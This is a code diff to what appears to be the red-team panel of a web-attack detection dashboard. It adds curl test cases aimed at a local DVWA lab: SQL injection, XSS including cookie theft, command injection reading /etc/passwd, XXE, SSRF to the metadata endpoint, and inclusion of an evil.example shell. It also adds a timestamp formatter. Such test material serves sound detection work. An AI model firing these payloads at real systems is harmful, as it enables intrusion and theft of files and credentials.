@@ -16,12 +16,60 @@ const RED_TEAM_CASES = [
     curl: "curl -i 'http://localhost:8080/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit'",
   },
   {
+    id: 'sqli_union',
+    title: 'SQLi union',
+    label: 'sqli_union',
+    code: 5,
+    summary: 'UNION SELECT payload matching the dataset SQLi union samples.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%201%2Cusername%2Cpassword%20FROM%20users--&Submit=Submit'",
+  },
+  {
+    id: 'sqli_blind_boolean',
+    title: 'Blind SQLi boolean',
+    label: 'sqli_blind_boolean',
+    code: 2,
+    summary: 'Boolean blind SQL injection against the DVWA blind SQLi route.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27%20AND%20%271%27%3D%271&Submit=Submit'",
+  },
+  {
+    id: 'sqli_blind_time',
+    title: 'Blind SQLi time',
+    label: 'sqli_blind_time',
+    code: 3,
+    summary: 'Time-delay SQL payload from the blind SQLi family.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/sqli_blind/?id=1%27%3B%20SLEEP%285%29--&Submit=Submit'",
+  },
+  {
+    id: 'sqli_error_based',
+    title: 'Error SQLi',
+    label: 'sqli_error_based',
+    code: 4,
+    summary: 'Database error extraction payload following dataset error-based SQLi rows.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/sqli/?id=1%27%20AND%20EXTRACTVALUE%281%2CCONCAT%280x7e%2Cversion%28%29%29%29--&Submit=Submit'",
+  },
+  {
     id: 'xss_reflected',
     title: 'Reflected XSS',
     label: 'xss_reflected',
     code: 7,
     summary: 'Reflected script payload to exercise XSS detection.',
     curl: "curl -i 'http://localhost:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E&Submit=Submit'",
+  },
+  {
+    id: 'xss_stored',
+    title: 'Stored XSS',
+    label: 'xss_stored',
+    code: 8,
+    summary: 'Stored message-board style XSS payload from the dataset.',
+    curl: "curl -i -X POST 'http://localhost:8080/vulnerabilities/xss_s/' -H 'Content-Type: application/x-www-form-urlencoded' --data 'txtName=redteam&mtxMessage=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&btnSign=Sign+Guestbook'",
+  },
+  {
+    id: 'xss_dom',
+    title: 'DOM XSS',
+    label: 'xss_dom',
+    code: 9,
+    summary: 'DOM sink payload using the DVWA default parameter.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/xss_d/?default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'",
   },
   {
     id: 'cmdi',
@@ -32,12 +80,108 @@ const RED_TEAM_CASES = [
     curl: "curl -i 'http://localhost:8080/vulnerabilities/exec/?ip=127.0.0.1%3Bcat%20/etc/passwd&Submit=Submit'",
   },
   {
+    id: 'cmdi_blind',
+    title: 'Blind command injection',
+    label: 'cmdi_blind',
+    code: 12,
+    summary: 'Time-delay shell payload matching blind command injection rows.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/exec/?ip=127.0.0.1%26%20sleep%205&Submit=Submit'",
+  },
+  {
+    id: 'rce',
+    title: 'Remote code execution',
+    label: 'rce',
+    code: 26,
+    summary: 'Command execution payload for RCE-style detection.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/exec/?ip=127.0.0.1%3Bpython3%20-c%20%22print%287%2A7%29%22&Submit=Submit'",
+  },
+  {
+    id: 'lfi',
+    title: 'Local file inclusion',
+    label: 'lfi',
+    code: 17,
+    summary: 'Local file disclosure via PHP filter wrapper.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd'",
+  },
+  {
     id: 'path_traversal',
     title: 'Path traversal',
     label: 'path_traversal',
     code: 18,
     summary: 'Traversal payload that should be blocked or flagged.',
     curl: "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd'",
+  },
+  {
+    id: 'rfi',
+    title: 'Remote file inclusion',
+    label: 'rfi',
+    code: 19,
+    summary: 'Remote include URL matching RFI samples in the dataset.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=http://evil.example/shell.txt'",
+  },
+  {
+    id: 'ssrf',
+    title: 'SSRF',
+    label: 'ssrf',
+    code: 20,
+    summary: 'Metadata-service URL used in SSRF detection examples.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=http://169.254.169.254/latest/meta-data/'",
+  },
+  {
+    id: 'csrf',
+    title: 'CSRF password change',
+    label: 'csrf',
+    code: 21,
+    summary: 'Cross-site request forgery style password-change URL.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/csrf/?password_new=pwned123&password_conf=pwned123&Change=Change'",
+  },
+  {
+    id: 'open_redirect',
+    title: 'Open redirect',
+    label: 'open_redirect',
+    code: 22,
+    summary: 'External redirect parameter from the open-redirect dataset family.',
+    curl: "curl -i 'http://localhost:8080/redirect.php?url=http://evil.example/phish'",
+  },
+  {
+    id: 'xxe',
+    title: 'XXE',
+    label: 'xxe',
+    code: 27,
+    summary: 'XML external entity payload for parser exposure checks.',
+    curl: "curl -i -X POST 'http://localhost:8080/vulnerabilities/xxe/' -H 'Content-Type: application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>'",
+  },
+  {
+    id: 'ssti',
+    title: 'SSTI',
+    label: 'ssti',
+    code: 13,
+    summary: 'Template expression payload following SSTI dataset rows.',
+    curl: "curl -i 'http://localhost:8080/template/render?name=%7B%7B7%2A7%7D%7D'",
+  },
+  {
+    id: 'evasion_encoding',
+    title: 'Encoded evasion',
+    label: 'evasion_encoding',
+    code: 34,
+    summary: 'Double-encoded script payload for normalization checks.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/xss_r/?name=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E&Submit=Submit'",
+  },
+  {
+    id: 'evasion_case_whitespace',
+    title: 'Case whitespace evasion',
+    label: 'evasion_case_whitespace',
+    code: 35,
+    summary: 'Mixed-case SQL keyword spacing pattern from the dataset.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/sqli/?id=1%27%20UnIoN%09SeLeCt%201%2Cuser%28%29%2Cdatabase%28%29--&Submit=Submit'",
+  },
+  {
+    id: 'evasion_null_byte',
+    title: 'Null byte evasion',
+    label: 'evasion_null_byte',
+    code: 36,
+    summary: 'Null-byte path payload for parser and decoder checks.',
+    curl: "curl -i 'http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd%00'",
   },
   {
     id: 'http_parameter_pollution',
@@ -196,8 +340,8 @@ async function refreshAiHealth() {
     if (statusNode) statusNode.textContent = `${payload.status || 'unknown'}`;
     if (dotNode) dotNode.className = `status-dot ${isHealthy ? 'good' : 'bad'}`;
     if (modelNode) modelNode.textContent = payload.model_name || 'unknown';
-    if (lastCheckedNode) lastCheckedNode.textContent = renderHealthValue(payload.last_checked_at);
-    if (lastSwappedNode) lastSwappedNode.textContent = renderHealthValue(payload.last_swapped_at);
+    if (lastCheckedNode) lastCheckedNode.textContent = formatHealthTimestamp(payload.last_checked_at);
+    if (lastSwappedNode) lastSwappedNode.textContent = formatHealthTimestamp(payload.last_swapped_at);
     if (lastErrorNode) lastErrorNode.textContent = renderHealthValue(payload.last_error);
   } catch (err) {
     if (statusNode) statusNode.textContent = 'Unavailable';
@@ -212,6 +356,43 @@ async function refreshAiHealth() {
 function renderHealthValue(value) {
   if (value === null || value === undefined) return 'null';
   return String(value);
+}
+
+function formatHealthTimestamp(value) {
+  if (value === null || value === undefined) return 'null';
+
+  let parsed = null;
+  if (typeof value === 'number' && Number.isFinite(value)) {
+    const ms = value > 1e12 ? value : value * 1000;
+    parsed = new Date(ms);
+  } else if (typeof value === 'string') {
+    const trimmed = value.trim();
+    if (!trimmed) return 'null';
+
+    const numeric = Number(trimmed);
+    if (Number.isFinite(numeric)) {
+      const ms = numeric > 1e12 ? numeric : numeric * 1000;
+      parsed = new Date(ms);
+    } else {
+      const parsedStringDate = new Date(trimmed);
+      if (!Number.isNaN(parsedStringDate.getTime())) {
+        parsed = parsedStringDate;
+      }
+    }
+  }
+
+  if (!parsed || Number.isNaN(parsed.getTime())) {
+    return renderHealthValue(value);
+  }
+
+  return parsed.toLocaleString(undefined, {
+    year: 'numeric',
+    month: 'short',
+    day: '2-digit',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+  });
 }
 
 function initRedTeamPanel() {
